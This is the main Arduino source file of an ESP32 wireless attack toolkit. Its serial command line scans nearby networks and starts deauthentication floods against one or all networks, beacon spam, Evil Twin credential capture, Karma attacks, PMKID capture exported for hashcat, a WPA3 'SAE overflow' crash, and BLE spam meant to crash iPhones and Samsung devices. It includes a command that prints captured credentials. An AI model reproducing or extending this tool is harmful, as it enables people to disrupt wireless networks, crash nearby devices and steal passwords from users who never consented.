// main.ino - ESP32-Omega Unified Toolkit
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_bt.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>
#include <SPIFFS.h>
#include <vector>
#include <map>
#include <set>

// ============= CONFIGURATION =============
#define VERSION "v2.0"
#define SERIAL_BAUD 115200
#define MAX_NETWORKS 50

// ============= GLOBAL OBJECTS =============
BLEAdvertising *pAdvertising;
bool serialCLIActive = true;

// ============= FEATURE FLAGS =============
typedef struct {
  bool deauthRunning;
  bool beaconSpamRunning;
  bool sourappleRunning;
  bool samspamRunning;
  bool karmaRunning;
  bool pmkidCaptureRunning;
  bool evilTwinRunning;
  bool deauthGuardRunning;
  bool saeOverflowRunning;
  bool snifferRunning;
} FeatureState;

FeatureState state = {false};

// ============= NETWORK CACHE =============
struct NetworkInfo {
  String ssid;
  String bssid;
  int channel;
  int rssi;
  bool isWPA2;
  bool isWPA3;
  bool isOpen;
  wifi_auth_mode_t authMode;
};

NetworkInfo networks[MAX_NETWORKS];
int networkCount = 0;
int currentTarget = -1;

// ============= INCLUDE MODULES =============
#include "commands.h"
#include "deauther.h"
#include "beaconspam.h"
#include "sourapple.h"
#include "samspam.h"
#include "karma.h"
#include "pmkid.h"
#include "eviltwin.h"
#include "deauthguard.h"
#include "saeoverflow.h"
#include "sniffer.h"

// ============= FUNCTION PROTOTYPES =============
void scanNetworks();
void listNetworks();
void selectNetwork(int idx);
void printStatus();
void showCredentials();
void saveConfig();
void loadConfig();
void processCommand(String cmd);
void serialCLI();
void printHelp();

// ============= COMMAND PARSER =============
void processCommand(String cmd) {
  cmd.trim();
  if (cmd.length() == 0) return;
  
  int spaceIdx = cmd.indexOf(' ');
  String command = (spaceIdx == -1) ? cmd : cmd.substring(0, spaceIdx);
  String args = (spaceIdx == -1) ? "" : cmd.substring(spaceIdx + 1);
  
  command.toLowerCase();
  
  // Network Commands
  if (command == "help" || command == "?") {
    printHelp();
  }
  else if (command == "scan") {
    scanNetworks();
  }
  else if (command == "list") {
    listNetworks();
  }
  else if (command == "select") {
    if (args.length() > 0) {
      int idx = args.toInt();
      if (idx >= 0 && idx < networkCount) {
        selectNetwork(idx);
      } else {
        Serial.println("Invalid network index");
      }
    } else {
      Serial.println("Usage: select <idx>");
    }
  }
  
  // Wi-Fi Attacks
  else if (command == "deauth") {
    if (args == "stop") {
      stopDeauthAttack();
      state.deauthRunning = false;
      Serial.println("Deauth stopped");
    } else if (args == "all") {
      startDeauthAll();
      state.deauthRunning = true;
      Serial.println("Deauth all networks");
    } else if (args.length() > 0) {
      int idx = args.toInt();
      if (idx >= 0 && idx < networkCount) {
        startDeauthAttack(idx);
        state.deauthRunning = true;
        Serial.printf("Deauth attack started on %s\n", networks[idx].ssid.c_str());
      } else {
        Serial.println("Invalid network index");
      }
    } else {
      Serial.println("Usage: deauth <idx> | all | stop");
    }
  }
  else if (command == "beacon") {
    if (args == "stop") {
      stopBeaconSpam();
      state.beaconSpamRunning = false;
      Serial.println("Beacon spam stopped");
    } else {
      int count = args.length() > 0 ? args.toInt() : 100;
      startBeaconSpam(count);
      state.beaconSpamRunning = true;
      Serial.printf("Beacon spam started (count: %d)\n", count);
    }
  }
  else if (command == "eviltwin") {
    if (args == "stop") {
      stopEvilTwin();
      state.evilTwinRunning = false;
      Serial.println("Evil Twin stopped");
    } else if (args.length() > 0) {
      int idx = args.toInt();
      if (idx >= 0 && idx < networkCount) {
        startEvilTwin(idx);
        state.evilTwinRunning = true;
        Serial.printf("Evil Twin started on %s\n", networks[idx].ssid.c_str());
      } else {
        Serial.println("Invalid network index");
      }
    } else {
      Serial.println("Usage: eviltwin <idx> | stop");
    }
  }
  else if (command == "karma") {
    handleKarmaCommand(args);
  }
  else if (command == "pmkid") {
    handlePMKIDCommand(args);
  }
  else if (command == "sae") {
    if (args == "stop") {
      stopSAEOverflow();
      state.saeOverflowRunning = false;
      Serial.println("SAE overflow stopped");
    } else if (args.length() > 0) {
      int idx = args.toInt();
      if (idx >= 0 && idx < networkCount) {
        startSAEOverflow(idx);
        state.saeOverflowRunning = true;
        Serial.printf("SAE overflow started on %s\n", networks[idx].ssid.c_str());
      } else {
        Serial.println("Invalid network index");
      }
    } else {
      Serial.println("Usage: sae <idx> | stop");
    }
  }
  
  // BLE Attacks
  else if (command == "sourapple") {
    if (args == "on") {
      startSourApple();
      state.sourappleRunning = true;
      Serial.println("SourApple started");
    } else if (args == "off") {
      stopSourApple();
      state.sourappleRunning = false;
      Serial.println("SourApple stopped");
    } else {
      Serial.println("Usage: sourapple [on/off]");
    }
  }
  else if (command == "samspam") {
    if (args == "on") {
      startSamSpam();
      state.samspamRunning = true;
      Serial.println("SamSpam started");
    } else if (args == "off") {
      stopSamSpam();
      state.samspamRunning = false;
      Serial.println("SamSpam stopped");
    } else {
      Serial.println("Usage: samspam [on/off]");
    }
  }
  
  // Sniffer & Detection
  else if (command == "sniffer") {
    if (args == "on") {
      startSniffer();
      state.snifferRunning = true;
      Serial.println("Sniffer started");
    } else if (args == "off") {
      stopSniffer();
      state.snifferRunning = false;
      Serial.println("Sniffer stopped");
    } else {
      Serial.println("Usage: sniffer [on/off]");
    }
  }
  else if (command == "guard") {
    if (args == "on") {
      startDeauthGuard();
      state.deauthGuardRunning = true;
      Serial.println("Deauth guard started");
    } else if (args == "off") {
      stopDeauthGuard();
      state.deauthGuardRunning = false;
      Serial.println("Deauth guard stopped");
    } else if (args == "status") {
      printDeauthGuardStatus();
    } else {
      Serial.println("Usage: guard [on/off | status]");
    }
  }
  else if (command == "show") {
    if (args == "creds" || args == "credentials") {
      showCredentials();
    } else if (args == "karma") {
      printKarmaStatus();
    } else if (args == "pmkid") {
      printPMKIDStatus();
    } else {
      Serial.println("Usage: show [creds | karma | pmkid]");
    }
  }
  
  // System Commands
  else if (command == "status") {
    printStatus();
  }
  else if (command == "version") {
    Serial.printf("ESP32-Omega %s\n", VERSION);
  }
  else if (command == "save") {
    saveConfig();
  }
  else if (command == "reboot") {
    Serial.println("Rebooting...");
    delay(100);
    ESP.restart();
  }
  else {
    Serial.printf("Unknown command: %s (type 'help' for list)\n", command.c_str());
  }
}

void scanNetworks() {
  Serial.println("Scanning for networks...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  networkCount = WiFi.scanNetworks();
  if (networkCount > MAX_NETWORKS) networkCount = MAX_NETWORKS;
  
  Serial.printf("Found %d networks:\n", networkCount);
  Serial.println("----------------------------------------");
  Serial.println("Idx  SSID                    CH  RSSI  Type");
  Serial.println("----------------------------------------");
  
  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid = WiFi.SSID(i);
    if (networks[i].ssid.length() == 0) networks[i].ssid = "<hidden>";
    networks[i].bssid = WiFi.BSSIDstr(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].authMode = WiFi.encryptionType(i);
    
    networks[i].isWPA2 = (networks[i].authMode == WIFI_AUTH_WPA2_PSK || 
                          networks[i].authMode == WIFI_AUTH_WPA2_ENTERPRISE);
    networks[i].isWPA3 = (networks[i].authMode == WIFI_AUTH_WPA3_PSK || 
                          networks[i].authMode == WIFI_AUTH_WPA2_WPA3_PSK);
    networks[i].isOpen = (networks[i].authMode == WIFI_AUTH_OPEN);
    
    String type = networks[i].isWPA3 ? "WPA3" : 
                  (networks[i].isWPA2 ? "WPA2" : 
                  (networks[i].isOpen ? "OPEN" : "WPA"));
    
    Serial.printf("[%2d] %-24s CH:%2d  %4d  %s\n", 
      i, networks[i].ssid.c_str(), networks[i].channel, 
      networks[i].rssi, type.c_str());
  }
  Serial.println("----------------------------------------");
}

void listNetworks() {
  if (networkCount == 0) {
    Serial.println("No networks found. Run 'scan' first.");
    return;
  }
  scanNetworks();
}

void selectNetwork(int idx) {
  if (idx >= 0 && idx < networkCount) {
    currentTarget = idx;
    Serial.printf("Selected: %s (CH:%d)\n", 
      networks[idx].ssid.c_str(), networks[idx].channel);
  }
}

void printStatus() {
  Serial.println("\n=== ESP32-Omega Status ===");
  Serial.printf("Network count: %d\n", networkCount);
  if (currentTarget >= 0 && currentTarget < networkCount) {
    Serial.printf("Current target: %s\n", networks[currentTarget].ssid.c_str());
  }
  Serial.printf("Deauth: %s\n", state.deauthRunning ? "RUNNING" : "STOPPED");
  Serial.printf("Beacon Spam: %s\n", state.beaconSpamRunning ? "RUNNING" : "STOPPED");
  Serial.printf("SourApple: %s\n", state.sourappleRunning ? "RUNNING" : "STOPPED");
  Serial.printf("SamSpam: %s\n", state.samspamRunning ? "RUNNING" : "STOPPED");
  Serial.printf("Karma: %s\n", state.karmaRunning ? "RUNNING" : "STOPPED");
  Serial.printf("PMKID: %s\n", state.pmkidCaptureRunning ? "RUNNING" : "STOPPED");
  Serial.printf("Evil Twin: %s\n", state.evilTwinRunning ? "RUNNING" : "STOPPED");
  Serial.printf("Deauth Guard: %s\n", state.deauthGuardRunning ? "RUNNING" : "STOPPED");
  Serial.printf("SAE Overflow: %s\n", state.saeOverflowRunning ? "RUNNING" : "STOPPED");
  Serial.printf("Sniffer: %s\n", state.snifferRunning ? "RUNNING" : "STOPPED");
}

void showCredentials() {
  Serial.println("\n=== Captured Credentials ===");
  // Evil Twin credentials
  extern std::vector<String> capturedCreds;
  if (capturedCreds.size() > 0) {
    Serial.println("Evil Twin Captured:");
    for (size_t i = 0; i < capturedCreds.size(); i++) {
      Serial.printf("  [%d] %s\n", i+1, capturedCreds[i].c_str());
    }
  }
  // PMKID captures
  extern std::vector<PMKIDEntry> pmkidList;
  if (pmkidList.size() > 0) {
    Serial.println("PMKID Captured:");
    for (size_t i = 0; i < pmkidList.size(); i++) {
      Serial.printf("  [%d] PMKID: %s (BSSID: %s)\n", 
        i+1, pmkidList[i].pmkid.c_str(), pmkidList[i].bssid.c_str());
    }
  }
  if (capturedCreds.size() == 0 && pmkidList.size() == 0) {
    Serial.println("No credentials captured yet.");
  }
}

void saveConfig() {
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS mount failed");
    return;
  }
  File config = SPIFFS.open("/config.txt", FILE_WRITE);
  if (!config) {
    Serial.println("Failed to open config file");
    return;
  }
  config.printf("VERSION=%s\n", VERSION);
  config.printf("DEAUTH=%d\n", state.deauthRunning);
  config.printf("BEACON=%d\n", state.beaconSpamRunning);
  config.close();
  Serial.println("Config saved");
}

void loadConfig() {
  if (!SPIFFS.begin(true)) return;
  File config = SPIFFS.open("/config.txt", FILE_READ);
  if (!config) return;
  
  while (config.available()) {
    String line = config.readStringUntil('\n');
    line.trim();
    if (line.startsWith("DEAUTH=")) {
      state.deauthRunning = line.substring(7).toInt() == 1;
    }
  }
  config.close();
}

void serialCLI() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    if (cmd.length() > 0) {
      processCommand(cmd);
      Serial.print("> ");
    }
  }
}

void printHelp() {
  Serial.println("\n=== ESP32-Omega Commands ===");
  Serial.println("");
  Serial.println("--- Network Commands ---");
  Serial.println("  scan              - Scan for Wi-Fi networks");
  Serial.println("  list              - List scanned networks");
  Serial.println("  select <idx>      - Select network by index");
  Serial.println("");
  Serial.println("--- Wi-Fi Attacks ---");
  Serial.println("  deauth <idx>      - Deauth attack on network");
  Serial.println("  deauth all        - Deauth all networks");
  Serial.println("  deauth stop       - Stop deauth attack");
  Serial.println("  beacon [count]    - Start beacon spam (default: 100)");
  Serial.println("  beacon stop       - Stop beacon spam");
  Serial.println("  eviltwin <idx>    - Start Evil Twin attack");
  Serial.println("  eviltwin stop     - Stop Evil Twin");
  Serial.println("  karma on          - Start Karma attack");
  Serial.println("  karma off         - Stop Karma attack");
  Serial.println("  karma auto        - Auto Karma mode");
  Serial.println("  karma spear <SSID> - Spear attack");
  Serial.println("  karma status      - Show Karma status");
  Serial.println("  karma list        - List detected probes");
  Serial.println("  karma add <SSID>  - Add custom probe");
  Serial.println("  karma remove <SSID> - Remove custom probe");
  Serial.println("  karma clear       - Clear custom probes");
  Serial.println("  pmkid <idx>       - Capture PMKID from AP");
  Serial.println("  pmkid stop        - Stop PMKID capture");
  Serial.println("  pmkid status      - Show PMKID status");
  Serial.println("  pmkid list        - List captured PMKIDs");
  Serial.println("  pmkid export      - Export PMKIDs (format: hashcat)");
  Serial.println("  pmkid clear       - Clear PMKID database");
  Serial.println("  sae <idx>         - SAE overflow (WPA3 crash)");
  Serial.println("  sae stop          - Stop SAE overflow");
  Serial.println("");
  Serial.println("--- BLE Attacks ---");
  Serial.println("  sourapple [on/off] - SourApple iOS crash");
  Serial.println("  samspam [on/off]  - Samsung BLE spam");
  Serial.println("");
  Serial.println("--- Sniffer & Detection ---");
  Serial.println("  sniffer [on/off]  - Packet sniffer");
  Serial.println("  guard [on/off]    - Deauth guard (detector)");
  Serial.println("  guard status      - Show guard statistics");
  Serial.println("  show creds        - Show captured credentials");
  Serial.println("  show karma        - Show karma stats");
  Serial.println("  show pmkid        - Show PMKID stats");
  Serial.println("");
  Serial.println("--- System Commands ---");
  Serial.println("  status            - Show current status");
  Serial.println("  version           - Show version");
  Serial.println("  save              - Save config to SPIFFS");
  Serial.println("  reboot            - Reboot ESP32");
  Serial.println("  help / ?          - Show this menu");
  Serial.println("");
  Serial.println("--- Examples ---");
  Serial.println("  scan");
  Serial.println("  deauth 3");
  Serial.println("  eviltwin 3");
  Serial.println("  sourapple on");
  Serial.println("  karma on");
  Serial.println("  pmkid 3");
  Serial.println("  guard on");
  Serial.println("  status");
  Serial.println("  show creds");
  Serial.println("----------------------------------------");
}

// ============= SETUP =============
void setup() {
  Serial.begin(SERIAL_BAUD);
  Serial.printf("\n\n=== ESP32-Omega %s ===\n", VERSION);
  Serial.println("Type 'help' for commands");
  Serial.println("Type 'scan' to find networks");
  Serial.println("----------------------------------------");
  
  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS mount failed");
  }
  
  // Initialize Wi-Fi for scanning
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  // Initial scan
  scanNetworks();
  
  // Print help on startup
  printHelp();
  
  // Load saved config
  loadConfig();
  
  // Initialize Karma
  initKarmaModule();
  
  // Initialize PMKID
  initPMKIDModule();
  
  Serial.println("\nReady.");
  Serial.print("> ");
}

// ============= MAIN LOOP =============
void loop() {
  // Process CLI commands via USB serial
  serialCLI();
  
  // Run active modules
  if (state.deauthRunning) {
    runDeauth();
  }
  if (state.beaconSpamRunning) {
    runBeaconSpam();
  }
  if (state.sourappleRunning) {
    runSourApple();
  }
  if (state.samspamRunning) {
    runSamSpam();
  }
  if (state.karmaRunning) {
    runKarmaLoop();
  }
  if (state.pmkidCaptureRunning) {
    runPMKIDLoop();
  }
  if (state.evilTwinRunning) {
    runEvilTwin();
  }
  if (state.deauthGuardRunning) {
    runDeauthGuard();
  }
  if (state.saeOverflowRunning) {
    runSAEOverflow();
  }
  if (state.snifferRunning) {
    runSniffer();
  }
  
  delay(10);
}
